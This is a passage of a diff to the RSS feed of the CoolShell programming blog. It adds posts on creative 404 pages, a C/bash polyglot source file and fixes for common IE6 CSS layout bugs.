src="https://coolshell.cn/wp-content/uploads/2009/04/snake-150x150.jpg" alt="某Python实现的尾部递归" width="150" height="150" /></a><a href="https://coolshell.cn/articles/737.html" class="wp_rp_title">某Python实现的尾部递归</a></li><li ><a href="https://coolshell.cn/articles/595.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/18.jpg" alt="Oracle成功收购Sun" width="150" height="150" /></a><a href="https://coolshell.cn/articles/595.html" class="wp_rp_title">Oracle成功收购Sun</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1830.html">正则表达式生成器</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1830.html/feed</wfw:commentRss>
+			<slash:comments>13</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>几个有趣的404错误页面</title>
+		<link>https://coolshell.cn/articles/1826.html</link>
+					<comments>https://coolshell.cn/articles/1826.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 19 Nov 2009 06:46:54 +0000</pubDate>
+				<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[404]]></category>
+		<category><![CDATA[Web]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1826</guid>
+
+					<description><![CDATA[<p>Windows的经典蓝屏 http://www.nerdiphythesoul.com/404.html http://huml.org/404.shtml I...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1826.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1826.html">几个有趣的404错误页面</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>Windows的经典蓝屏<br />
+<a href="http://www.nerdiphythesoul.com/404.html">http://www.nerdiphythesoul.com/404.html</a><br />
+<a href="http://huml.org/404.shtml">http://huml.org/404.shtml</a></p>
+<p>IE经典的404错误（但却又不一样）<br />
+<a href="http://www.homestarrunner.com/systemisdown.html">http://www.homestarrunner.com/systemisdown.html</a></p>
+<p>出错的时候不忘让你学习学习HTTP的返回码<br />
+<a href="http://www.notonebit.com/s">http://www.notonebit.com/s</a></p>
+<p><span id="more-1826"></span></p>
+<p>漫画式的出错(这样的方法可能会很多)<br />
+<a href="http://www.homestarrunner.com/thisisntgoingtowork">http://www.homestarrunner.com/thisisntgoingtowork</a></p>
+<p>废话！当然是文件找不到！<br />
+<a href="http://www.itchyrobot.com/404">http://www.itchyrobot.com/404</a></p>
+<p>ASCII码拼成的404<br />
+<a href="http://10e.org/404.html">http://10e.org/404.html</a><br />
+<a href="http://www.zhangshuodesign.com/404.html">http://www.zhangshuodesign.com/404.html</a></p>
+<p>出错了，那就玩个游戏吧<br />
+<a href="http://atomicbombshell.com/error-page/">http://atomicbombshell.com/error-page/</a><br />
+<a href="http://www.loadeddice.co.uk/errors/404.php">http://www.loadeddice.co.uk/errors/404.php</a><br />
+<a href="http://s8.hk/error/page404.html">http://s8.hk/error/page404.html</a></p>
+<p>随机搞笑图片<br />
+<a href="http://www.b3ta.com/404">http://www.b3ta.com/404</a></p>
+<p>终端界面式的<br />
+<a href="http://www.psyklone.com/jhjhj.html">http://www.psyklone.com/jhjhj.html</a></p>
+<p>超级玛丽<br />
+<a href="http://www.dawdle.com/error_page.php">http://www.dawdle.com/error_page.php</a></p>
+<p>流程图<br />
+<a href="http://www.orangecoat.com/404">http://www.orangecoat.com/404</a><br />
+<a href="http://rubberducky.org/404">http://rubberducky.org/404</a></p>
+<p>生活中的404<br />
+<a href="http://www.ddz.net/404/index.htm">http://www.ddz.net/404/index.htm</a></p>
+<p>通缉不存在的页面<br />
+<a href="http://www.hongkiat.com/blog/60-really-cool-and-creative-error-404-pages/">http://www.hongkiat.com/blog/60-really-cool-and-creative-error-404-pages/</a></p>
+<p>电视屏幕型<br />
+<a href="http://aviationreviews.com/404">http://aviationreviews.com/404</a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" alt="如何免费的让网站启用HTTPS" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18094.html" class="wp_rp_title">如何免费的让网站启用HTTPS</a></li><li ><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/12/1053-DHH-150x150.jpg" alt="DHH 谈混合移动应用开发" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12225.html" class="wp_rp_title">DHH 谈混合移动应用开发</a></li><li ><a href="https://coolshell.cn/articles/12206.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/12/html6-150x150.jpeg" alt="HTML6 展望" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12206.html" class="wp_rp_title">HTML6 展望</a></li><li ><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/11/inbox2-640x264-150x150.jpg" alt="Google Inbox如何跨平台重用代码？" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12136.html" class="wp_rp_title">Google Inbox如何跨平台重用代码？</a></li><li ><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/10/edsm-150x150.gif" alt="State Threads 回调终结者" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1826.html">几个有趣的404错误页面</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1826.html/feed</wfw:commentRss>
+			<slash:comments>9</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>C语言和sh脚本的杂交代码</title>
+		<link>https://coolshell.cn/articles/1824.html</link>
+					<comments>https://coolshell.cn/articles/1824.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Thu, 19 Nov 2009 05:47:51 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Bash]]></category>
+		<category><![CDATA[C++]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1824</guid>
+
+					<description><![CDATA[<p>在网上看到了一个把 C语言和bash杂并起来的例子，这个示子如下所示。在下面这个例子中，我们把脚本用#if 0这个预编译给起来，这样就不会让其编译到C语言中了。...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1824.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1824.html">C语言和sh脚本的杂交代码</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>在网上看到了一个把 C语言和bash杂并起来的例子，这个示子如下所示。在下面这个例子中，我们把脚本用#if 0这个预编译给起来，这样就不会让其编译到C语言中了。</p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#if 0
+echo &quot;Hello from bash!&quot;
+exit
+#endif
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+int main(int argc, char* argv[]) {
+  puts(&quot;Hello from C!&quot;);
+  return EXIT_SUCCESS;
+}</pre>
+<p>下面，让我看看如果来使用这样的程序：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">$ sh test.sh.c
+Hello from bash!
+$ gcc test.sh.c -o test
+$ ./test
+Hello from C!
+</pre>
+<p>你甚至还可以做一个自我编译，并自我运行的源代码。如下所示：</p>
+<p><span id="more-1824"></span></p>
+<pre data-enlighter-language="c" class="EnlighterJSRAW">#if 0
+file=`mktemp`
+gcc -o $file $0
+$file
+rm $file
+exit
+#endif
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char *argv[]) {
+  puts(&quot;Hello from C!&quot;);
+  return EXIT_SUCCESS;
+}</pre>
+<p>运行：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">$ sh test.sh.c
+Hello from C!
+$</pre>
+<p>当然，我并不建议你在真正的开发环境中这样使用，我只不过是在介绍一个比较有趣的用法，仅此而已！<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/03/rust-social-wide-150x150.jpg" alt="Rust语言的编程范式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20845.html" class="wp_rp_title">Rust语言的编程范式</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="Leetcode 编程训练" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a></li><li ><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/10/edsm-150x150.gif" alt="State Threads 回调终结者" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12012.html" class="wp_rp_title">State Threads 回调终结者</a></li><li ><a href="https://coolshell.cn/articles/11973.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/09/bashbug-150x150.jpg" alt="bash代码注入的安全漏洞" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11973.html" class="wp_rp_title">bash代码注入的安全漏洞</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1824.html">C语言和sh脚本的杂交代码</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1824.html/feed</wfw:commentRss>
+			<slash:comments>11</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>9个最常见IE的Bug及其fix</title>
+		<link>https://coolshell.cn/articles/1817.html</link>
+					<comments>https://coolshell.cn/articles/1817.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 17 Nov 2009 07:33:02 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[CSS]]></category>
+		<category><![CDATA[HTML]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1817</guid>
+
+					<description><![CDATA[<p>Internet Explorer &#8211; Web程序员的毒药。在IE上开发时间中有超过60%的时间是花在和IE的bug进行搏斗，让你的开发生产率严重下...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1817.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1817.html">9个最常见IE的Bug及其fix</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright" src="http://nettuts.s3.amazonaws.com/494_ie/images/200x200.jpg" alt="9个最常见IE的Bug及其fix" width="138" height="132" /></p>
+<p>Internet Explorer &#8211; Web程序员的毒药。在IE上开发时间中有超过60%的时间是花在和IE的bug进行搏斗，让你的开发生产率严重下降。下面是一个教程，告诉你9个IE上最常见的BUG以及如何解决它们。</p>
+<h4>1. 居中布局</h4>
+<p>创建一个CSS定义把一个元素放到中间的位置，可能是每一个Web开发人员都会做的事情。最简单的做法是为你的元素增加一个<em>margin: auto;</em> ，然而 IE 6.0 会出现很多奇怪的行为。让我们来看一个例子。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#container{
+	border: solid 1px #000;
+	background: #777;
+	width: 400px;
+	height: 160px;
+	margin: 30px 0 0 30px;
+}
+
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 100px;
+	margin: 30px auto;
+
+}
+</pre>
+<p>下面是我们所期望的输出：</p>
+<p><span id="more-1817"></span></p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/1-1.png" border="0" alt="Tutorial Image" /></div>
+<p>但IE却给我们这样的输出：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/1-2.png" border="0" alt="Tutorial Image" /></div>
+<p>这应该是IE 6对margin的 <em>auto</em> 并没有正确的设置。但幸运的是，这是很容易被修正的。</p>
+<p><strong>解决方法</strong></p>
+<p>最简单的方法是在父元件中使用 <em>text-align: center</em> 属性，而在元件中使用 <em>text-align: left</em> 。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#container{
+	border: solid 1px #000;
+	background: #777;
+	width: 400px;
+	height: 160px;
+	margin: 30px 0 0 30px;
+	text-align: center;
+}
+
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 100px;
+	margin: 30px 0;
+    	text-align: left;
+
+}
+</pre>
+<h4>2. 楼梯式的效果</h4>
+<p>几乎所有的Web开发者都会使用list来创建导航条。下面是你可能会用到的代码：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#&quot;&gt;&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+</pre>
+<p> </p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+ul {
+    list-style: none;
+}
+
+ul li a {
+   	display: block;
+   	width: 130px;
+	height: 30px;
+   	text-align: center;
+   	color: #fff;
+   	float: left;
+	background: #95CFEF;
+	border: solid 1px #36F;
+	margin: 30px 5px;
+}
+</pre>
+<p>一个符合标准的浏览器会是下面这样：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/2-1.png" alt="Tutorial Image" border="0" /></div>
+<p>但IE却是这样的：</p>
+<p><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/2-2.png" alt="Tutorial Image" border="0" /></p>
+<p>下面是两个解决方法</p>
+<p><b>解决方法一</b></p>
+<p>设置li元件的float属性。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+ul li {
+	float: left;
+}
+</pre>
+<p><strong>解决方法二</strong></p>
+<p>设置 <em>display: inline</em> 属性。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+ul li {
+	display: inline
+}
+</pre>
+<h4>3. float元件的两倍空白</h4>
+<p>请看下面的代码：</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	width: 300px;
+	height: 100px;
+	float: left;
+	margin: 30px 0 0 30px;
+	border: solid 1px #36F;
+}
+</pre>
+<p>期望的结果是：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/3-1.png" border="0" alt="Tutorial Image" /></div>
+<p>IE的结果是：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/3-2.png" border="0" alt="Tutorial Image" /></div>
+<p><strong>解决方案</strong></p>
+<p>和上面那个BUG的解决方案一样，设置 <em>display: inline</em> 属性可以解决问题。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	width: 300px;
+	height: 100px;
+	float: left;
+	margin: 30px 0 0 30px;
+	border: solid 1px #36F;
+   	display: inline;
+}
+</pre>
+<h4>4. 无法设置微型高度</h4>
+<p>我们发现在IE中使用 <em>height: XXpx</em> 这样的属性无法设置比较小的高度。下面是个例子（注意高度是2px）：</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 2px;
+	margin: 30px 0;
+}
+</pre>
+<p>期望结果： 2px的元件加1px的边框.</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/4-1.png" border="0" alt="Tutorial Image" /></div>
+<p>IE的结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/4-2.png" border="0" alt="Tutorial Image" /></div>
+<p><strong>解决方案一</strong></p>
+<p>这个BUG的产生原因很简单，IE不允许元件的高度小于字体的高度，所以，下面的fix是设置上字体大小。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 2px;
+	margin: 30px 0;
+    	font-size: 0;
+}
+</pre>
+<p><strong>解决方案二</strong></p>
+<p>但是最佳的解决方法是使用 <em>overflow: hidden</em> 。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 2px;
+	margin: 30px 0;
+    	overflow: hidden
+}
+</pre>
+<h4>5. 跨出边界</h4>
+<p>这个BUG是很难看的。当父元件中使用了 <em>overflow</em> 的 <em>auto</em> 属性，并且在其里放入相关元件。你会看来里面的元件会跨出来。下面是一个示例：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">
+&lt;div id=&quot;element&quot;&gt;&lt;div id=&quot;anotherelement&quot;&gt;&lt;/div&gt;&lt;/div&gt;
+</pre>
+<p> </p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 150px;
+	margin: 30px 0;
+	overflow: auto;
+}
+
+#anotherelement{
+	background: #555;
+	width: 150px;
+	height: 175px;
+	position: relative;
+	margin: 30px;
+}
+</pre>
+<p>期望的结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/5-1.png" border="0" alt="Tutorial Image" /></div>
+<p>IE的结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/5-2.png" border="0" alt="Tutorial Image" /></div>
+<p><strong>解决方法</strong></p>
+<p>设置 position: relative;属性</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 300px;
+	height: 150px;
+	margin: 30px 0;
+	overflow: auto;
+    	position: relative;
+}
+</pre>
+<h4>6. Fixing the Broken Box Model</h4>
+<p>Internet Explorer曲解了“盒子模子”可能是最不可原谅的事情了。IE 6 这个半标准的浏览器回避了这个事情，但这个问题还是会因为IE运行在“怪异模式”下出现。</p>
+<p>两个Div元件。一个是有fix的，一个是没有的。而他们不同的高和宽加上padding的总合却是不一样的。下图的上方是被修正的，下方则没有。</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/6.png" border="0" alt="Tutorial Image" /></div>
+<p><strong>解决方法</strong></p>
+<p>我相信这个事情即不需要解释也不需要演示，这应该是大多数人都明白的。下面是一个很相当怪异的解决方案</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	width: 400px;
+    	height: 150px;
+	padding: 50px;
+}
+</pre>
+<p>上面的定义也就是说：</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element {
+    width: 400px;
+    height: 150px;
+   \height: 250px;
+   \width: 500px
+}
+</pre>
+<p>是的，你要原来的长和宽上加上了padding。但这个fix只会作用于IE了的“怪异模式”，所以你不需要担心在IE6的正常模式下会有问题。</p>
+<h4>7. 设置min-height和min-width</h4>
+<p>IE忽略了min-height。</p>
+<p><strong>解决方法一</strong></p>
+<p>这个fix由 <a href="http://www.dustindiaz.com/min-height-fast-hack/">Dustin Diaz</a>提供。其利用了 <em>!important</em> 下面是代码片段：</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element {
+  min-height:150px;
+  height:auto !important;
+  height:150px;
+}
+</pre>
+<p><strong>解决方法二</strong></p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element {
+    min-height: 150px;
+    height: 150px;
+}
+
+html&gt;body #element {
+	height: auto;
+}
+</pre>
+<h4>8. Float 布局错误行为 Misbehaving</h4>
+<p>使用无table的布局最重要的就是使用CSS的float元件。在很多情况下，IE6处理起来好像在摸索阶段，有些时候，你会发现很多奇怪的行为。比如在其中有一些文本的时候。</p>
+<p>来看一下下面这个示例：</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">
+&lt;div id=&quot;container&quot;&gt;
+	&lt;div id=&quot;element&quot;&gt;http://net.tutsplus.com/&lt;/div&gt;
+	&lt;div id=&quot;anotherelement&quot;&gt;&lt;/div&gt;
+&lt;/div&gt;
+</pre>
+<p> </p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element, #anotherelement{
+	background: #95CFEF;
+	border: solid 1px #36F;
+	width: 100px;
+	height: 150px;
+	margin: 30px;
+	padding: 10px;
+	float: left;
+}
+
+#container{
+	background: #C2DFEF;
+	border: solid 1px #36F;
+	width: 365px;
+	margin: 30px;
+	padding: 5px;
+	overflow: auto;
+}
+</pre>
+<p>期望结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/8-1.png" border="0" alt="Tutorial Image" /></div>
+<p>IE的结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/8-2.png" border="0" alt="Tutorial Image" /></div>
+<p>你可以看到其中的不同了</p>
+<p><strong>解决方法</strong></p>
+<p>要解决这个问题没有什么好的方法。只有一个方法，那就是使用 <em>overflow: hidden</em> 。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+#element{
+	background: #C2DFEF;
+	border: solid 1px #36F;
+	width: 365px;
+	margin: 30px;
+	padding: 5px;
+	overflow: hidden;
+}
+</pre>
+<h4>9. 在list项目门的空行</h4>
+<p>先看下面的例子</p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">
+&lt;ul&gt;
+ &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 1&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 2&lt;/a&gt;&lt;/li&gt;
+ &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Link 3&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</pre>
+<p> </p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+ul {
+	margin:0;
+	padding:0;
+	list-style:none;
+}
+
+li a {
+	background: #95CFEF;
+	display: block;
+}
+</pre>
+<p>期望结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/9-1.png" border="0" alt="Tutorial Image" /></div>
+<p>IE的结果：</p>
+<div class="tutorial_image"><img decoding="async" src="http://nettuts.s3.amazonaws.com/494_ie/images/9-2.png" border="0" alt="Tutorial Image" /></div>
+<p>Fortunately, there are a plethora of fixes you could try.</p>
+<p><strong>解决方法一</strong></p>
+<p>定义height来解决</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+li a {
+	background: #95CFEF;
+	display: block;
+    	height: 200px;
+}
+</pre>
+<p><strong>解决方法二</strong></p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+li a {
+	background: #95CFEF;
+	float: left;
+    	clear: left;
+}
+</pre>
+<p><strong>解决方法三</strong></p>
+<p>为 <em>li</em> 加上<em>display: inline</em>。</p>
+<pre data-enlighter-language="css" class="EnlighterJSRAW">
+li {
+	display: inline;
+}
+</pre>
+<h4>结论</h4>
+<p>调界面是一件很难的事，调一个CSS的HTML界面是一件更难的事，在IE下调一个CSS的HTML界面是难上加难的事。</p>
+<p>文章：<a href="http://net.tutsplus.com/tutorials/html-css-techniques/9-most-common-ie-bugs-and-how-to-fix-them/" target="_blank">来源</a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/pretty-code-150x150.gif" alt="Chrome开发者工具的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a></li><li ><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/05/Render-Process-150x150.jpg" alt="浏览器的渲染原理简介" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a></li><li ><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/03/css-layouts-150x150.gif" alt="CSS 布局:40个教程、技巧、例子和最佳实践" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a></li><li ><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="一些有意思的贴子和工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3903.html" class="wp_rp_title">一些有意思的贴子和工具</a></li><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/3063.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/0.jpg" alt="40个很不错的CSS技术" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3063.html" class="wp_rp_title">40个很不错的CSS技术</a></li></ul></div></div>The post <a 